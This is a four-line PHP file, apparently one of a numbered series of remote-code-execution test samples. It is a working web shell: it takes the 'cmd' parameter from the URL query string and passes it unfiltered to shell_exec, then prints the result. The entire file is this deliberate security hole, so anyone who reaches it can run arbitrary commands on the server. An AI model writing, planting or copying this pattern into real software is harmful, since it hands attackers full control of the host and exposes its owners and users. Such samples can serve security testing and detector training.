<?php
// RCE test variation #788
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>